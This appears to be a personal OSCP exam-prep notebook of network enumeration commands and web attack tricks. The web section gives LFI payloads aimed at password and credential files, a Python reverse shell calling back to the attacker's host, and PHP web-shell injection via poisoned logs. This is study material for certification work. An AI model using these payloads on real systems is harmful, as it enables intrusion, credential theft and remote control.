# redteam-notebook
Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.

## Early Enumeration - generic

### Network wide scan - first steps
`nmap -sn 10.11.1.0/24`

### netbios scan
`nbtscan -r 10.11.1.0/24`

### DNS recon
`dnsrecon -r 10.11.1.0/24 -n <DNS IP>`
  
### Scan specific target with nmap
`nmap -sV -sT -p- <target IP> `
  
### Guess OS using xprobe2
`xprobe2 <target IP>`

### Search for SMB vulns
`nmap -p139,445 <target IP> --script smb-vuln*`
  
### Enumerate using SMB (null session)
`enum4linux -a <target IP>`
  
### Enumerate using SMB (w/user & pass)
`enum4linux -a -u <user> -p <passwd> <targetIP>`

## Website Enumeration

### quick enumeration using wordlist
`gobuster -u http://<target IP> -w /usr/share/dirb/wordlists/big.txt`
  
### enumeration and basic vuln scan of a website
`nikto -host http://<target IP>`
  
## Website tips and tricks

### PHP

* Check for LFI

Add `/etc/passwd%00` to any GET/POST arguments. On windows try `C:\Windows\System32\drivers\etc\hosts%00` or `C:\autoexec.bat%00`.
A quick win could also be any of these files `c:\sysprep.inf`, `c:\sysprep\sysprep.xml` or `c:\unattend.xml` as they would contain local admin credentials. On linux it's worth checking `/proc/self/environ` to see if there are any credentials passed to the running process via env vars.

* Fetching .php files via LFI

`/index.php?somevar=php://filter/read=convert.base64-encode/resource=<file path>%00` this will return base64 encoded PHP file. Good for fishing up `config.php` or similar.

* Abusing /proc/self/environ LFI to gain reverse shell
In some situations it's possible to abuse `/proc/self/environ` to execute a command. For example:
`index.php?somevar=/proc/self/environ&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* Apache access.log + LFI = PHP injection
If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.

with netcat send a request like this:
```GET /<?php system($_GET["cmd"]);?>

```

* auth.log + LFI
`ssh <?php system($_GET["cmd"]);?>@targetIP` and then LFI `/var/log/auth.log`


## References
* [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
* [FuzzySecurity](http://www.fuzzysecurity.com) - this is something you must bookmark... period. I found the [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) especially useful.
* [WMIC reference/guide](https://www.computerhope.com/wmic.htm)
* [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) - this is a must have for working on Windows boxes.
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
* [ColdFusion for PenTesters](http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf)
* [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) - Good read. Check out other cheat sheets on this page too!
* [Changeme](https://github.com/ztgrace/changeme) - default password scanner
* [CIRT Default Passwords DB](https://cirt.net/passwords)
* [From LFI to Shell](http://resources.infosecinstitute.com/local-file-inclusion-code-execution)
